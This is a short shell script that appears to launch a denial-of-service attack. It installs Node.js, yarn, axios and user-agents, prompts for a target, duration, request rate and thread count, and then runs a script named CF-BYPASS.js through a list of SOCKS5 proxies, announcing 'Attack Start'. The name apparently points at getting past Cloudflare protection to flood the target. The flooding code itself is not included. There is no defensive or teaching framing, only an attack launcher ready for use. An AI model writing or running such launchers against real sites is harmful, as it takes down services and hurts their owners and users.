echo -e "Installation..."
apt update && apt upgrade -y
apt install yarn nodejs -y
yarn add axios user-agents
echo -e "Installation Complete."

echo "Enter target name:"
read tgt
echo "Enter time in seconds e.g 240:"
read tim
echo "Enter Rate(No of request per second):"
read rate
echo "Enter threads e.g 1000000000:"
read thrd

echo "Attack Start...."
node CF-BYPASS.js $tgt $tim $rate $thrd socks5.txt


